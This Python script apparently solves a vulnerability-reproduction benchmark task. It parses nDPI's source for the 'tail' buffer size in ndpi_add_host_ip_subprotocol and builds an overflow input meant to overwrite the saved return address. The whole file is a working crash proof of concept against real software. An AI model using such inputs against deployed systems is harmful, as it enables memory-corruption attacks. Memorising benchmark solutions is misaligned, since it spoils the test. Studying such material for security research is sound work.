import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        buffer_size = 32  # Default assumption based on ground truth analysis (56 total - 8 prefix - 16 overflow)

        try:
            with tarfile.open(src_path, 'r:*') as tar:
                target_member = None
                # Locate ndpi_main.c in the source tree
                for member in tar.getmembers():
                    if member.name.endswith('src/lib/ndpi_main.c'):
                        target_member = member
                        break
                
                if target_member:
                    f = tar.extractfile(target_member)
                    if f:
                        content = f.read().decode('utf-8', errors='ignore')
                        
                        # Find the start of the vulnerable function
                        func_idx = content.find("ndpi_add_host_ip_subprotocol")
                        if func_idx != -1:
                            # Search for the definition of 'tail' buffer within the function scope
                            # Using a window of 4000 characters to cover local variable declarations
                            scope = content[func_idx:func_idx+4000]
                            match = re.search(r'char\s+tail\s*\[\s*(\d+)\s*\]', scope)
                            if match:
                                buffer_size = int(match.group(1))
        except Exception:
            # Fallback to default size if source extraction or parsing fails
            pass

        # Construct PoC input
        # Format: <IP> <OVERFLOW_PAYLOAD>
        # The function parses a custom rule line. 'tail' typically captures the protocol name or suffix.
        # "1.1.1.1 " is 8 bytes.
        # Payload = buffer_size + 16 bytes (to overwrite saved frame pointer and return address on 64-bit)
        
        prefix = b"1.1.1.1 "
        payload = b"A" * (buffer_size + 16)
        
        return prefix + payload
